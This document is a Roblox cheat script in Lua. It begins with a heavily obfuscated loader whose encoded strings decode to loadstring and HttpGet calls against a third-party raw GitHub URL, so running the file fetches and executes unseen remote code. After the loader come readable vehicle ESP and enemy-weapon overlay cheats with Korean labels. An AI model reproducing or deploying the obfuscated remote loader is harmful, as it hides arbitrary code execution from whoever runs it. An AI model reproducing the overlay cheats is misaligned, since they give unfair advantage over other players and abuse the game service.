local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v83=v2(v0(v30,16));if v19 then local v91=v5(v83,v19);v19=nil;return v91;else return v83;end end end);local function v20(v31,v32,v33) if v33 then local v84=(v31/((5 -3)^(v32-(2 -1))))%(((1 + 2) -1)^(((v33-1) -(v32-(2 -1))) + (620 -(555 + 64)))) ;return v84-(v84%(932 -(857 + 74))) ;else local v85=(1 + 1)^(v32-(569 -(367 + 201))) ;return (((v31%(v85 + v85))>=v85) and ((1805 -(282 + 595)) -(214 + 713))) or 0 ;end end local function v21() local v34=1637 -((2793 -(226 + 1044)) + (496 -382)) ;local v35;while true do if (v34==1) then return v35;end if (v34==(0 + 0)) then v35=v1(v16,v18,v18);v18=v18 + ((118 -(32 + 85)) -0) ;v34=1066 -(68 + 997) ;end end end local function v22() local v36=0 + 0 + 0 ;local v37;local v38;while true do if (v36==(1 + 0)) then return (v38 * ((4821 -3608) -(892 + 65))) + v37 ;end if (v36==(952 -(802 + 150))) then v37,v38=v1(v16,v18,v18 + 2 + 0 );v18=v18 + ((10 -6) -2) ;v36=1 -0 ;end end end local function v23() local v39,v40,v41,v42=v1(v16,v18,v18 + (5 -2) );v18=v18 + 4 ;return (v42 * (12211951 + 4565265)) + (v41 * (66533 -(915 + 82))) + (v40 * 256) + v39 ;end local function v24() local v43=0 -0 ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if (v43==(2 + (3 -2))) then if (v48==((0 -0) -0)) then if (v47==((2046 -(814 + 45)) -(1069 + 118))) then return v49 * 0 ;else local v108=0 -0 ;while true do if ((0 -0)==v108) then v48=1;v46=0 + (0 -0) ;break;end end end elseif (v48==(3636 -1589)) then return ((v47==(0 + 0 + 0)) and (v49 * ((792 -(368 + 423))/(0 -0)))) or (v49 * NaN) ;end return v8(v49,v48-((368 + 673) -(10 + 8)) ) * (v46 + (v47/((7 -5)^52))) ;end if (v43==(443 -(416 + 26))) then v46=3 -(887 -(261 + 624)) ;v47=(v20(v45,1 + 0 ,35 -(26 -11) ) * ((440 -(145 + 293))^(462 -(44 + 386)))) + v44 ;v43=1488 -(998 + 488) ;end if ((0 + 0)==v43) then v44=v23();v45=v23();v43=1;end if (2==v43) then v48=v20(v45,18 + 3 ,803 -(201 + 571) );v49=((v20(v45,32)==(1139 -(116 + 1022))) and  -(4 -3)) or (1 + 0) ;v43=3;end end end local function v25(v50) local v51;if  not v50 then v50=v23();if (v50==(1080 -(1020 + 60))) then return "";end end v51=v3(v16,v18,(v18 + v50) -(1424 -(630 + 793)) );v18=v18 + v50 ;local v52={};for v67=3 -2 , #v51 do v52[v67]=v2(v1(v3(v51,v67,v67)));end return v6(v52);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return 0 + 0 ;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();local v60=(function() return;end)();while true do if (v53~=(1 + 0)) then else v58=(function() return {v55,v56,nil,v57};end)();v59=(function() return v23();end)();v60=(function() return {};end)();for v92= #",",v59 do local v93=(function() return 0;end)();local v94=(function() return;end)();local v95=(function() return;end)();local v96=(function() return;end)();while true do if (v93==1) then v96=(function() return nil;end)();while true do if (v94~=(676 -(534 + 141))) then else if (v95== #"\\") then v96=(function() return v21()~=(0 + 0) ;end)();elseif (v95==2) then v96=(function() return v24();end)();elseif (v95== #"19(") then v96=(function() return v25();end)();end v60[v92]=(function() return v96;end)();break;end if ((0 + 0)~=v94) then else local v130=(function() return 0;end)();while true do if (v130~=(0 + 0)) then else v95=(function() return v21();end)();v96=(function() return nil;end)();v130=(function() return 1;end)();end if ((1 -0)~=v130) then else v94=(function() return 1;end)();break;end end end end break;end if (v93==(0 -0)) then local v109=(function() return 0 -0 ;end)();while true do if (v109==(1 + 0)) then v93=(function() return 1;end)();break;end if ((0 + 0)==v109) then v94=(function() return 0;end)();v95=(function() return nil;end)();v109=(function() return 1;end)();end end end end end v53=(function() return 398 -(115 + 281) ;end)();end if (v53==2) then v58[ #"19("]=(function() return v21();end)();for v97= #",",v23() do local v98=(function() return v21();end)();if (v20(v98, #">", #"/")~=0) then else local v104=(function() return 0;end)();local v105=(function() return;end)();local v106=(function() return;end)();local v107=(function() return;end)();while true do if (v104~=1) then else local v124=(function() return 0;end)();local v125=(function() return;end)();while true do if (v124==0) then v125=(function() return 0 -0 ;end)();while true do if (v125==0) then local v170=(function() return 0;end)();while true do if ((0 + 0)==v170) then v107=(function() return {v22(),v22(),nil,nil};end)();if (v105==(0 -0)) then local v174=(function() return 867 -(550 + 317) ;end)();local v175=(function() return;end)();while true do if (v174==(0 -0)) then v175=(function() return 0 -0 ;end)();while true do if (v175==(0 -0)) then v107[ #"gha"]=(function() return v22();end)();v107[ #"?id="]=(function() return v22();end)();break;end end break;end end elseif (v105== #"|") then v107[ #"xxx"]=(function() return v23();end)();elseif (v105==2) then v107[ #"91("]=(function() return v23() -((287 -(134 + 151))^16) ;end)();elseif (v105~= #"-19") then else local v180=(function() return 0;end)();local v181=(function() return;end)();while true do if ((1665 -(970 + 695))==v180) then v181=(function() return 0;end)();while true do if ((0 -0)==v181) then v107[ #"91("]=(function() return v23() -(2^(2006 -(582 + 1408))) ;end)();v107[ #"xnxx"]=(function() return v22();end)();break;end end break;end end end v170=(function() return 3 -2 ;end)();end if (1==v170) then v125=(function() return 1;end)();break;end end end if (v125==1) then v104=(function() return 2 -0 ;end)();break;end end break;end end end if (v104==(7 -5)) then if (v20(v106, #" ", #"]")== #"}") then v107[2]=(function() return v60[v107[2]];end)();end if (v20(v106,1826 -(1195 + 629) ,2 -0 )== #"/") then v107[ #"91("]=(function() return v60[v107[ #"xnx"]];end)();end v104=(function() return 244 -(187 + 54) ;end)();end if (0~=v104) then else v105=(function() return v20(v98,2, #"19(");end)();v106=(function() return v20(v98, #"?id=",6);end)();v104=(function() return 1;end)();end if (v104~=3) then else if (v20(v106, #"-19", #"xxx")== #"!") then v107[ #"http"]=(function() return v60[v107[ #"xnxx"]];end)();end v55[v97]=(function() return v107;end)();break;end end end end for v99= #":",v23() do v56,v99,v28=(function() return v54(v56,v99,v28);end)();end return v58;end if (0==v53) then local v90=(function() return 0;end)();while true do if (v90~=(782 -(162 + 618))) then else v53=(function() return 1;end)();break;end if (v90==1) then v56=(function() return {};end)();v57=(function() return {};end)();v90=(function() return 2;end)();end if (v90==0) then v54=(function() return function(v110,v111,v112) local v113=(function() return 0 + 0 ;end)();local v114=(function() return;end)();while true do if (v113~=(0 + 0)) then else v114=(function() return 0 -0 ;end)();while true do if (v114==0) then local v169=(function() return 0;end)();while true do if (v169==(0 -0)) then v110[v111-#"}" ]=(function() return v112();end)();return v110,v111,v112;end end end end break;end end end;end)();v55=(function() return {};end)();v90=(function() return 1 + 0 ;end)();end end end end end local function v29(v61,v62,v63) local v64=v61[1637 -((2575 -(373 + 829)) + 263) ];local v65=v61[(1733 -(476 + 255)) -(451 + 549) ];local v66=v61[(1131 -(369 + 761)) + 2 ];return function(...) local v69=v64;local v70=v65;local v71=v66;local v72=v27;local v73=1 -0 ;local v74= -(1 -0);local v75={};local v76={...};local v77=v12("#",...) -(1385 -(746 + 638)) ;local v78={};local v79={};for v86=0 -0 ,v77 do if (v86>=v71) then v75[v86-v71 ]=v76[v86 + 1 + 0 ];else v79[v86]=v76[v86 + (1 -0) ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do v81=v69[v73];v82=v81[1];if (v82<=(347 -(218 + 123))) then if ((v82<=((916 + 667) -(1535 + 46))) or (2087>2372)) then if (v82<=(0 + 0)) then local v115=v81[2];local v116,v117=v72(v79[v115](v13(v79,v115 + 1 + 0 ,v81[563 -(306 + 254) ])));v74=(v117 + v115) -(1 + (0 -0)) ;local v118=0;for v127=v115,v74 do local v128=0 -0 ;while true do if ((v128==(320 -(53 + 267))) or (4445<4149)) then v118=v118 + (1468 -(899 + 568)) ;v79[v127]=v116[v118];break;end end end elseif ((v82>(414 -(15 + 398))) or (1818==85)) then v79[v81[2 + 0 ]]=v63[v81[7 -4 ]];else local v133=v81[605 -(268 + 335) ];v79[v133]=v79[v133](v13(v79,v133 + (291 -(60 + 230)) ,v74));end elseif (v82<=(576 -(426 + (276 -130)))) then if ((630<2127) and (v82==(1 + 2))) then v79[v81[2]]=v63[v81[1459 -((520 -(64 + 174)) + 1174) ]];else local v137=811 -(569 + 242) ;local v138;while true do if ((v137==(0 -(0 + 0))) or (1938==2514)) then v138=v81[2];v79[v138]=v79[v138](v13(v79,v138 + 1 + 0 ,v74));break;end end end elseif (v82>(1 + 4)) then v79[v81[1026 -(706 + 318) ]]=v81[1254 -((1067 -346) + 530) ];else local v141=1271 -((1281 -(144 + 192)) + 326) ;local v142;local v143;while true do if (v141==((218 -(42 + 174)) -(1 + 0))) then v79[v142 + 1 + 0 + 0 ]=v143;v79[v142]=v143[v81[704 -(271 + 429) ]];break;end if ((4255>=55) and (v141==(0 + 0))) then v142=v81[1502 -(1408 + 92) ];v143=v79[v81[1089 -(196 + 265 + (2129 -(363 + 1141))) ]];v141=(2869 -(1183 + 397)) -(993 + 295) ;end end end elseif ((2999>1156) and (v82<=(1 + 8))) then if (v82<=(1178 -(418 + 753))) then local v119=0;local v120;local v121;local v122;local v123;while true do if (v119==(1 + (2 -1))) then for v155=v120,v74 do local v156=0 + 0 ;while true do if (v156==(0 + 0 + 0)) then v123=v123 + 1 + 0 + 0 ;v79[v155]=v121[v123];break;end end end break;end if (v119==(530 -(406 + 123))) then v74=(v122 + v120) -(1770 -(1749 + 20)) ;v123=0 + 0 ;v119=1 + 1 ;end if (v119==(1322 -(1249 + 73))) then v120=v81[1 + 1 ];v121,v122=v72(v79[v120](v13(v79,v120 + ((3121 -(1913 + 62)) -(466 + 679)) ,v81[3])));v119=2 -1 ;end end elseif ((2350>1155) and (v82==(22 -14))) then do return;end else v79[v81[1902 -(106 + 1794) ]]();end elseif (v82<=(4 + 7)) then if (v82>(3 + 7)) then v79[v81[5 -3 ]]();else do return;end end elseif (v82==(26 -14)) then v79[v81[5 -3 ]]=v81[117 -(4 + 110) ];else local v146=584 -(36 + 21 + 527) ;local v147;local v148;while true do if ((4029<=4853) and (v146==(754 -(239 + 514)))) then v79[v147 + 1 + 0 ]=v148;v79[v147]=v148[v81[1431 -(41 + 1386) ]];break;end if (((1329 -(797 + 532))==v146) or (516>3434)) then v147=v81[105 -(17 + 86) ];v148=v79[v81[2 + 1 ]];v146=1 + 0 ;end end end v73=v73 + (1 -0) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403503Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F6F6D6567616761792Q30392F6B656B70726F6A6563742F726566732F68656164732F6D61696E2F6B656B2E6C756100083Q0012033Q00013Q001203000100023Q00200500010001000300120C000300046Q000100034Q00015Q00022Q000B3Q000100012Q000A3Q00017Q00",v9(),...);

local Players = game:GetService("Players")
local Camera = workspace.CurrentCamera
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local vehicleESP = {}
local vehicleESPEnabled = true

local function isVehicle(model)
	return model:FindFirstChild("DriveSeat") ~= nil
end

local function updateVehicleESP()
	if not vehicleESPEnabled then
		for _, esp in pairs(vehicleESP) do
			if esp.name then esp.name.Visible = false end
			if esp.distance then esp.distance.Visible = false end
		end
		return
	end

	for _, obj in pairs(vehicleESP) do
		obj.name.Visible = false
		obj.distance.Visible = false
	end

	for _, vehicle in ipairs(workspace:GetChildren()) do
		if isVehicle(vehicle) then
			local seat = vehicle.DriveSeat
			local distance = (Camera.CFrame.Position - seat.Position).Magnitude
			if distance <= 2200 then
				local screenPos, onScreen = Camera:WorldToViewportPoint(seat.Position)
				if onScreen then
					local esp = vehicleESP[vehicle]
					if not esp then
						local nameLabel = Drawing.new("Text")
						nameLabel.Font = 0
						nameLabel.Size = 24
						nameLabel.Color = Color3.fromRGB(0, 255, 0)
						nameLabel.Center = true
						nameLabel.Outline = true
						nameLabel.OutlineColor = Color3.fromRGB(0, 0, 0)

						local distanceLabel = Drawing.new("Text")
						distanceLabel.Font = 0
						distanceLabel.Size = 24
						distanceLabel.Color = Color3.fromRGB(255, 255, 255)
						distanceLabel.Center = true
						distanceLabel.Outline = true
						distanceLabel.OutlineColor = Color3.fromRGB(0, 0, 0)

						esp = {
							name = nameLabel,
							distance = distanceLabel
						}
						vehicleESP[vehicle] = esp
					end

					esp.name.Text = "Car"
					esp.name.Position = Vector2.new(screenPos.X, screenPos.Y)
					esp.name.Visible = true

					esp.distance.Text = tostring(math.floor(distance / 3.64)) .. "m"
					esp.distance.Position = Vector2.new(screenPos.X, screenPos.Y + 14)
					esp.distance.Visible = true
				end
			end
		end
	end
end

workspace.ChildRemoved:Connect(function(child)
	local esp = vehicleESP[child]
	if esp then
		if esp.name then esp.name:Remove() end
		if esp.distance then esp.distance:Remove() end
		vehicleESP[child] = nil
	end
end)

RunService.RenderStepped:Connect(updateVehicleESP)

-- 🔑 F1 키로 토글
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.F1 then
		vehicleESPEnabled = not vehicleESPEnabled
		print("Vehicle ESP is now", vehicleESPEnabled and "ON" or "OFF")
		if not vehicleESPEnabled then
			for _, esp in pairs(vehicleESP) do
				esp.name.Visible = false
				esp.distance.Visible = false
			end
		end
	end
end)


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local Mouse = LocalPlayer:GetMouse()

local boxWidth = 280
local lineSpacing = 20

local box = Drawing.new("Square")
box.Filled = true
box.Transparency = 0.5
box.Color = Color3.new(0, 0, 0)
box.Visible = true
box.ZIndex = 1

local textLines = {}
local maxLines = 20

for i = 1, maxLines do
	local t = Drawing.new("Text")
	t.Size = 16
	t.Color = Color3.new(1, 1, 1)
	t.Outline = true
	t.Font = 2
	t.Visible = false
	t.ZIndex = 2
	table.insert(textLines, t)
end

local function updateBoxHeight(lineCount)
	local height = lineCount * lineSpacing + 10
	box.Size = Vector2.new(boxWidth, height)
end

local dragging = false
local dragStartPos = nil
local mouseStartPos = nil

box.Position = Vector2.new(Camera.ViewportSize.X - boxWidth - 20, 20)

UserInputService.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		local mousePos = Vector2.new(Mouse.X, Mouse.Y)
		if mousePos.X >= box.Position.X and mousePos.X <= box.Position.X + box.Size.X and
		   mousePos.Y >= box.Position.Y and mousePos.Y <= box.Position.Y + box.Size.Y then
			dragging = true
			dragStartPos = box.Position
			mouseStartPos = mousePos
		end
	end
end)

UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = false
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = Vector2.new(Mouse.X, Mouse.Y) - mouseStartPos
		local newPos = dragStartPos + delta
		box.Position = newPos
		for i, t in ipairs(textLines) do
			if t.Visible then
				t.Position = Vector2.new(newPos.X + 5, newPos.Y + 5 + (i - 1) * lineSpacing)
			end
		end
	end
end)

local function getGunInfoLines(target)
	local lines = {}

	if not target or not target:FindFirstChild("GunInventory") then
		table.insert(lines, "표적 없음")
		return lines
	end

	table.insert(lines, target.Name .. " 님")

	local gunInventory = target:FindFirstChild("GunInventory")
	local gunObjects = gunInventory:GetChildren()

	if #gunObjects == 0 then
		table.insert(lines, "총 없음")
		return lines
	end

	for _, gunObj in ipairs(gunObjects) do
		if gunObj:IsA("ObjectValue") and gunObj.Value then
			local gunName = tostring(gunObj.Value)
			local scopeText = "배율없음"
			local reticleObj = gunObj:FindFirstChild("AttachmentReticle")
			if reticleObj and reticleObj:IsA("ObjectValue") and reticleObj.Value then
				scopeText = tostring(reticleObj.Value) .. "배율"
			end
			table.insert(lines, gunName .. " - " .. scopeText)

			local mag = gunObj:FindFirstChild("BulletsInMagazine")
			local reserve = gunObj:FindFirstChild("BulletsInReserve")
			if mag and reserve and mag:IsA("IntValue") and reserve:IsA("IntValue") then
				table.insert(lines, tostring(mag.Value) .. " / " .. tostring(reserve.Value))
			end
		end
	end

	return lines
end

local function getClosestPlayerToCenter()
	local closestPlayer = nil
	local closestDist = math.huge
	local screenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			local screenPos, onScreen = Camera:WorldToViewportPoint(player.Character.HumanoidRootPart.Position)
			if onScreen then
				local dist = (Vector2.new(screenPos.X, screenPos.Y) - screenCenter).Magnitude
				if dist < closestDist then
					closestDist = dist
					closestPlayer = player
				end
			end
		end
	end

	return closestPlayer
end

RunService.RenderStepped:Connect(function()
	local target = getClosestPlayerToCenter()
	local lines = getGunInfoLines(target)

	updateBoxHeight(#lines)

	for i, t in ipairs(textLines) do
		t.Visible = false
	end

	for i, line in ipairs(lines) do
		local t = textLines[i]
		t.Text = line
		t.Visible = true
		t.Position = Vector2.new(box.Position.X + 5, box.Position.Y + 5 + (i - 1) * lineSpacing)
	end
end)
